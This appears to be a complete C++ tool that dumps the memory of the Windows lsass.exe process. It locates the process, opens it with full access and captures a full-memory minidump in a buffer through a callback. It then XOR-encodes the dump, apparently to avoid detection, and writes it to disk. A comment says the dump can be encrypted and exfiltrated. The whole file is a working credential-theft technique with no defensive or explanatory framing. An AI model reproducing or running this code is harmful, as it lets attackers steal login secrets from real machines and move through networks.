#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <vector>
#pragma comment (lib, "Dbghelp.lib")

using namespace std;

// Buffer for saving the minidump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

void XORBuffer(LPVOID buffer, size_t bufferSize, unsigned char key) {
    unsigned char* byteBuffer = (unsigned char*)buffer;
    for (size_t i = 0; i < bufferSize; i++) {
        byteBuffer[i] ^= key;
    }
}

BOOL WriteBufferToFile(LPVOID buffer, size_t bufferSize, const char* filePath) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD bytesWritten;
    BOOL result = WriteFile(hFile, buffer, bufferSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    return result;
}

BOOL CALLBACK MiniDumpCallback(
    PVOID CallbackParam,
    const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case ModuleCallback:
    case ThreadCallback:
    case ThreadExCallback:
    case MemoryCallback:
    case CancelCallback:
        return TRUE;

    case IncludeModuleCallback:
    case IncludeThreadCallback:
    case ThreadInfoCallback:
    case ThreadExInfoCallback:
    case MemoryInfoCallback:
        return FALSE;

    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback:
        CallbackOutput->Status = S_OK;

        if (CallbackInput->Io.Buffer && bytesRead < 1024 * 1024 * 75)
        {
            DWORD_PTR offset = CallbackInput->Io.Offset;
            DWORD_PTR length = CallbackInput->Io.BufferBytes;

            if (offset + length > 1024 * 1024 * 75)
                length = 1024 * 1024 * 75 - offset;

            memcpy((LPVOID)((DWORD_PTR)dumpBuffer + offset), CallbackInput->Io.Buffer, length);
            bytesRead += length;

            printf("[+] Minidump offset: 0x%llx; length: 0x%llx\n", CallbackInput->Io.Offset, CallbackInput->Io.BufferBytes);
        }
        break;

    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;

    default:
        return TRUE;
    }
    return TRUE;
}

int main() {
    DWORD lsassPID = 0;
    HANDLE lsassHandle = NULL;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    char processName[MAX_PATH] = {0};
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Get lsass PID
    if (Process32First(snapshot, &processEntry)) {
        do {
            strcpy_s(processName, processEntry.szExeFile);
            if (_stricmp(processName, "lsass.exe") == 0) {
                lsassPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
        printf("[+] lsass PID=0x%x\n", lsassPID);
    }

    if (lsassPID == 0) {
        printf("Failed to find lsass.exe process.\n");
        CloseHandle(snapshot);
        return 1;
    }

    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (lsassHandle == NULL) {
        printf("OpenProcess failed with error %lu\n", GetLastError());
        CloseHandle(snapshot);
        return 1;
    }

    // Set up minidump callback
    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callbackInfo.CallbackRoutine = MiniDumpCallback;
    callbackInfo.CallbackParam = NULL;

    // Dump lsass
    HANDLE hFile = CreateFileA("dummy.dmp", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile failed with error %lu\n", GetLastError());
        CloseHandle(lsassHandle);
        CloseHandle(snapshot);
        return 1;
    }

    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, hFile, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
    CloseHandle(hFile);

    if (isDumped) {
        // At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
        unsigned char key = 0xAA; // Example XOR key
        XORBuffer(dumpBuffer, bytesRead, key);

        const char* filePath = "output.bin";
        if (WriteBufferToFile(dumpBuffer, bytesRead, filePath)) {
            printf("Buffer written to %s successfully.\n", filePath);
        }
        else {
            printf("Failed to write buffer to %s.\n", filePath);
        }

        HeapFree(GetProcessHeap(), 0, dumpBuffer);
    } else {
        printf("MiniDumpWriteDump failed with error %lu\n", GetLastError());
    }

    CloseHandle(lsassHandle);
    CloseHandle(snapshot);

    return 0;
}
